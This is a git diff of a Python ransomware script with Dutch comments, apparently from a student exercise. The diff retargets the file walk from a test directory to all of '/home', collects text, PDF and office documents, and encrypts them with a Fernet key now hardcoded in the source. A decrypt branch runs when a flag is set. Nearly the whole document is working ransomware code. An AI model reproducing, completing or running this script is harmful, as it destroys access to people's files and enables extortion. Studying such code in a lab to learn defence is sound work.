@@ -18,20 +18,17 @@ except:
 #Def var voor opslaan van lijstdata van zoekfunctie.
 bestandenlijst = []
 # Using os.walk()
-for dirpath, dirs, files in os.walk('/home/sven/Documenten/Jaar 1/P2/S4/Leertaak/randsomware/Test'): 
+for dirpath, dirs, files in os.walk('/home'): 
   for filename in files:
     fname = os.path.join(dirpath,filename)
     if fname.endswith('.txt') or fname.endswith('.pdf') or fname.endswith('.odt') or fname.endswith('.docx'):
       bestandenlijst.append(fname)
 
-print(check_1)
-
 #Decrypt
+key = "LvKBgbdRvSZZHwBt9WcJw9rR5Aya4BIkzi-NpZKGnzw="
 if check_1 == 1:
    print("DEcrypt")
-   with open('Key.txt', 'rb') as f:
-      key = f.read()
-      crypto = Fernet(key)
+   crypto = Fernet(key)
    for file in bestandenlijst:
       try:
          with open(file, 'rb') as f:
@@ -44,9 +41,7 @@ if check_1 == 1:
 else:
    #Encryptiefunctie gebaseerd op lijst.
     print("Encrypt")
-    with open('Key.txt', 'rb') as f:
-       key = f.read()
-       crypto = Fernet(key)
+    crypto = Fernet(key)
     for file in bestandenlijst:
         with open(file, 'rb') as f:
             file_inhoud = f.read()
